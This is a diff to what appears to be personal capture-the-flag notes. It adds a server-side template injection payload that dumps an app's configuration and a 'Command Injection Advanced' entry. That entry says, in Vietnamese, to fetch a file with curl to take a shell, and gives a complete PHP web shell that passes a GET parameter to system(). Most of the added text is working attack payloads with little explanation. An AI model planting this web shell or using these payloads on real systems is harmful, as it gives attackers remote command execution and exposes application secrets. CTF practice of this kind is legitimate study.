@@ -242,5 +242,29 @@ for i in range(1,50):
             flag += chr(j)
             print(flag)
 ```
+### simple ssti
+```{{config.items()}}```
+### Command Injection Advanced
+- dùng curl down file rồi chiếm shell 
+```php
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+</html>
+```
+### session-basic
+- wtf /admin ???
 ### out of money
 - 
